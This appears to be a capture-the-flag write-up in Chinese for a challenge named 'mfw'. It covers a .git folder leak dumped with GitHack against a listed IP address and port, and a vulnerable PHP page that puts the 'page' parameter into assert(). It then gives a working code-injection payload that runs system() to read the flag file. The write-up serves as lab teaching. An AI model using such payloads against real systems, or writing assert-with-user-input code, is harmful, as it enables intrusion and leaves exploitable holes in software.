# mfw
git泄露,这里用到kali,因为自带python2,使用GitHack工具
```
python2 GitHack.py http://61.147.171.105:56791/.git
```
执行后下载了index.php(kali中打开不会乱码)
```
<?php

if (isset($_GET['page'])) {
	$page = $_GET['page'];
} else {
	$page = "home";
}

$file = "templates/" . $page . ".php";

// I heard '..' is dangerous!
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");

// TODO: Make this look nice
assert("file_exists('$file')") or die("That file doesn't exist!");

?>
```
考了一个assert函数,危险函数造成代码执行,get传入参数$page

assert("strpos('') or system('cat+./templates/flag.php');//.php', '..') === false")
assert("file_exists('') or system('cat+./templates/flag.php');//.php')")

$page=') or system('cat+./templates/flag.php');//